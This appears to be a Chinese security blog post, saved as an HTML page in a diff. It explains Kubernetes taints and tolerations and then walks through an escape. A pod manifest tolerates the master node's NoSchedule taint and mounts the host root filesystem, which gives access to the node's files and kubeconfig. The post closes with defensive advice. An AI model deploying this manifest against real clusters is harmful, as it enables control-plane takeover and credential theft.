@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="K8s 集群默认给 Master 节点打了 NoSchedule 污点，普通 Pod 不会调度上去。但如果拿到了一个带 Create 权限的凭据，可以通过污点容忍把 Pod 强行调度到 Master，再挂载宿主机根目录完成逃逸。本文整理一下这条攻击路径的完整链条。 1. 背景：污点与容忍污点 (Taints) —— 打在节点上，阻止 Pod 调度。 容忍 (Tolerations) —— 打在 P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master">
+<meta property="og:url" content="https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/index.html">
+<meta property="og:site_name" content="0xd3ac&#39;s Blog">
+<meta property="og:description" content="K8s 集群默认给 Master 节点打了 NoSchedule 污点，普通 Pod 不会调度上去。但如果拿到了一个带 Create 权限的凭据，可以通过污点容忍把 Pod 强行调度到 Master，再挂载宿主机根目录完成逃逸。本文整理一下这条攻击路径的完整链条。 1. 背景：污点与容忍污点 (Taints) —— 打在节点上，阻止 Pod 调度。 容忍 (Tolerations) —— 打在 P">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114215942-1818140185.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114242342-1939908142.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114256903-1174883148.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114310017-298119589.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114322656-206406249.png">
+<meta property="article:published_time" content="2025-04-01T03:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-12T10:02:46.179Z">
+<meta property="article:author" content="54188">
+<meta property="article:tag" content="Kubernetes">
+<meta property="article:tag" content="容器安全">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="特权逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114215942-1818140185.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="0xd3ac&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">archives</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&text=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&is_video=false&description=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master&body=Check out this article: https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&name=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&t=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%83%8C%E6%99%AF%EF%BC%9A%E6%B1%A1%E7%82%B9%E4%B8%8E%E5%AE%B9%E5%BF%8D"><span class="toc-number">1.</span> <span class="toc-text">1. 背景：污点与容忍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%B1%A1%E7%82%B9%E7%9A%84%E4%B8%89%E7%A7%8D%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 污点的三种效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E4%B8%BA%E4%BB%80%E4%B9%88-Master-%E9%9C%80%E8%A6%81%E6%B1%A1%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 为什么 Master 需要污点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E5%AE%B9%E5%BF%8D%E7%9A%84%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 容忍的匹配规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%B0%83%E5%BA%A6%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">2. 调度器是如何工作的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%BD%B1%E5%93%8D%E8%B0%83%E5%BA%A6%E7%9A%84%E4%B8%BB%E8%A6%81%E5%9B%A0%E7%B4%A0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 影响调度的主要因素</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%EF%BC%9A%E4%BB%8E-Worker-%E6%A8%AA%E5%90%91%E5%88%B0-Master"><span class="toc-number">3.</span> <span class="toc-text">3. 攻击：从 Worker 横向到 Master</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Master-%E7%9A%84%E9%BB%98%E8%AE%A4%E6%B1%A1%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Master 的默认污点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%9E%84%E9%80%A0%E5%B8%A6%E5%AE%B9%E5%BF%8D%E5%BA%A6%E7%9A%84-Pod"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 构造带容忍度的 Pod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E6%95%88%E6%9E%9C"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4. 总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">54188</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-01T03:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Cloud-Security/">Cloud Security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Kubernetes/" rel="tag">Kubernetes</a>, <a class="p-category" href="/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" rel="tag">容器安全</a>, <a class="p-category" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag">横向移动</a>, <a class="p-category" href="/tags/%E7%89%B9%E6%9D%83%E9%80%83%E9%80%B8/" rel="tag">特权逃逸</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>K8s 集群默认给 Master 节点打了 <code>NoSchedule</code> 污点，普通 Pod 不会调度上去。但如果拿到了一个带 <code>Create</code> 权限的凭据，可以通过<strong>污点容忍</strong>把 Pod 强行调度到 Master，再挂载宿主机根目录完成逃逸。本文整理一下这条攻击路径的完整链条。</p>
+<h2 id="1-背景：污点与容忍"><a href="#1-背景：污点与容忍" class="headerlink" title="1. 背景：污点与容忍"></a>1. 背景：污点与容忍</h2><p><strong>污点 (Taints)</strong> —— 打在节点上，阻止 Pod 调度。</p>
+<p><strong>容忍 (Tolerations)</strong> —— 打在 Pod 上，”我不怕这个污点”，强行往上调度。</p>
+<h3 id="1-1-污点的三种效果"><a href="#1-1-污点的三种效果" class="headerlink" title="1.1 污点的三种效果"></a>1.1 污点的三种效果</h3><table>
+<thead>
+<tr>
+<th>效果</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>NoSchedule</code></td>
+<td>Pod 不会被调度到该节点</td>
+</tr>
+<tr>
+<td><code>PreferNoSchedule</code></td>
+<td>尽量不调度到该节点（软限制）</td>
+</tr>
+<tr>
+<td><code>NoExecute</code></td>
+<td>不调度，且驱逐节点上已有 Pod</td>
+</tr>
+</tbody></table>
+<p>查看节点污点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node &lt;nodename&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-为什么-Master-需要污点"><a href="#1-2-为什么-Master-需要污点" class="headerlink" title="1.2 为什么 Master 需要污点"></a>1.2 为什么 Master 需要污点</h3><p>Master 节点运行着 <code>kube-apiserver</code> 等控制面组件，是整个集群的核心。默认情况下 Master 会被标记污点，避免业务 Pod 抢占资源或造成安全风险。</p>
+<h3 id="1-3-容忍的匹配规则"><a href="#1-3-容忍的匹配规则" class="headerlink" title="1.3 容忍的匹配规则"></a>1.3 容忍的匹配规则</h3><p>容忍度定义在 Pod 的 <code>spec.tolerations</code> 中，支持两种匹配方式：</p>
+<ul>
+<li><strong>Equal</strong> — <code>key</code>、<code>value</code>、<code>effect</code> 三者完全匹配</li>
+<li><strong>Exists</strong> — <code>key</code> 和 <code>effect</code> 匹配即可，<code>value</code> 留空</li>
+</ul>
+<h2 id="2-调度器是如何工作的"><a href="#2-调度器是如何工作的" class="headerlink" title="2. 调度器是如何工作的"></a>2. 调度器是如何工作的</h2><p><code>kube-scheduler</code> 是 Master 上的默认调度器，它的工作流程：</p>
+<ol>
+<li>API Server 收到创建 Pod 请求，数据写入 etcd</li>
+<li>Scheduler 通过 list-watch 监听到新 Pod</li>
+<li>经过调度算法（过滤 + 打分）选出最优 Node</li>
+<li>结果写回 etcd，对应节点的 kubelet 负责创建容器</li>
+</ol>
+<p><img src="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114215942-1818140185.png"></p>
+<h3 id="2-1-影响调度的主要因素"><a href="#2-1-影响调度的主要因素" class="headerlink" title="2.1 影响调度的主要因素"></a>2.1 影响调度的主要因素</h3><p><strong>资源限制</strong>：调度器检查每个节点的 CPU &#x2F; Memory 是否满足 Pod 需求。</p>
+<p><strong>nodeSelector</strong>：最简单的方式，Pod 只调度到带有指定 label 的节点。</p>
+<p><strong>nodeAffinity</strong>：<code>nodeSelector</code> 的升级版，支持逻辑组合，更灵活。</p>
+<h2 id="3-攻击：从-Worker-横向到-Master"><a href="#3-攻击：从-Worker-横向到-Master" class="headerlink" title="3. 攻击：从 Worker 横向到 Master"></a>3. 攻击：从 Worker 横向到 Master</h2><h3 id="3-1-思路"><a href="#3-1-思路" class="headerlink" title="3.1 思路"></a>3.1 思路</h3><ol>
+<li>拿到一个具有 Pod Create 权限的凭据（通常通过创建特权容器逃逸到某台 Worker 节点）</li>
+<li>默认 Pod 不允许调度到 Master（因为 <code>NoSchedule</code> 污点）</li>
+<li>在 Pod 定义中添加 <code>tolerations</code>，匹配 Master 的污点标签</li>
+<li>Pod 被调度到 Master 后，挂载宿主机根目录，完成逃逸</li>
+</ol>
+<h3 id="3-2-Master-的默认污点"><a href="#3-2-Master-的默认污点" class="headerlink" title="3.2 Master 的默认污点"></a>3.2 Master 的默认污点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node master-node</span><br><span class="line"><span class="comment"># Taints: node-role.kubernetes.io/master:NoSchedule</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114242342-1939908142.png"></p>
+<h3 id="3-3-构造带容忍度的-Pod"><a href="#3-3-构造带容忍度的-Pod" class="headerlink" title="3.3 构造带容忍度的 Pod"></a>3.3 构造带容忍度的 Pod</h3><p>关键就在 <code>spec.tolerations</code> 这段——声明”我能容忍 <code>node-role.kubernetes.io/master</code> 的 <code>NoSchedule</code> 污点”：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">masterpwn1</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">cloud-prod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">tolerations:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;node-role.kubernetes.io/master&quot;</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">&quot;Exists&quot;</span></span><br><span class="line">    <span class="attr">effect:</span> <span class="string">&quot;NoSchedule&quot;</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pwnmaster-vol</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pwnmaster-vol</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">cloud-account</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-效果"><a href="#3-4-效果" class="headerlink" title="3.4 效果"></a>3.4 效果</h3><p>部署后 Pod 成功落在 Master 节点：</p>
+<p><img src="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114256903-1174883148.png"></p>
+<p>由于挂载了 Master 宿主机根目录 <code>/</code> 到容器内的 <code>/mnt</code>，可以任意读写 Master 节点的文件系统：</p>
+<p><img src="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114310017-298119589.png"></p>
+<p>直接读取 kubeconfig 配置文件：</p>
+<p><img src="https://img2024.cnblogs.com/blog/1818641/202504/1818641-20250401114322656-206406249.png"></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>这条链路的核心就两点：</p>
+<ul>
+<li>Master 节点的 <code>NoSchedule</code> 污点可以通过 Pod 的 <code>tolerations</code> 绕过</li>
+<li>一旦 Pod 落在 Master，配合 <code>hostPath</code> 挂载根目录就能拿到 Master 的控制权</li>
+</ul>
+<p>防御侧可以考虑：限制 <code>tolerations</code> 的使用（准入控制器）、禁止挂载宿主机敏感路径、限制 Pod 的 <code>serviceAccount</code> 权限。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">archives</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%83%8C%E6%99%AF%EF%BC%9A%E6%B1%A1%E7%82%B9%E4%B8%8E%E5%AE%B9%E5%BF%8D"><span class="toc-number">1.</span> <span class="toc-text">1. 背景：污点与容忍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%B1%A1%E7%82%B9%E7%9A%84%E4%B8%89%E7%A7%8D%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 污点的三种效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E4%B8%BA%E4%BB%80%E4%B9%88-Master-%E9%9C%80%E8%A6%81%E6%B1%A1%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 为什么 Master 需要污点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E5%AE%B9%E5%BF%8D%E7%9A%84%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 容忍的匹配规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%B0%83%E5%BA%A6%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">2. 调度器是如何工作的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%BD%B1%E5%93%8D%E8%B0%83%E5%BA%A6%E7%9A%84%E4%B8%BB%E8%A6%81%E5%9B%A0%E7%B4%A0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 影响调度的主要因素</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%EF%BC%9A%E4%BB%8E-Worker-%E6%A8%AA%E5%90%91%E5%88%B0-Master"><span class="toc-number">3.</span> <span class="toc-text">3. 攻击：从 Worker 横向到 Master</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Master-%E7%9A%84%E9%BB%98%E8%AE%A4%E6%B1%A1%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Master 的默认污点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%9E%84%E9%80%A0%E5%B8%A6%E5%AE%B9%E5%BF%8D%E5%BA%A6%E7%9A%84-Pod"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 构造带容忍度的 Pod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E6%95%88%E6%9E%9C"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4. 总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&text=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&is_video=false&description=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master&body=Check out this article: https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&title=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&name=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0xd3ac.github.io/2025/04/01/k8s-taint-toleration-scheduler-escape/&t=K8s 污点容忍调度逃逸 —— 从 Worker 横向到 Master"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2026
+    54188
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">archives</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
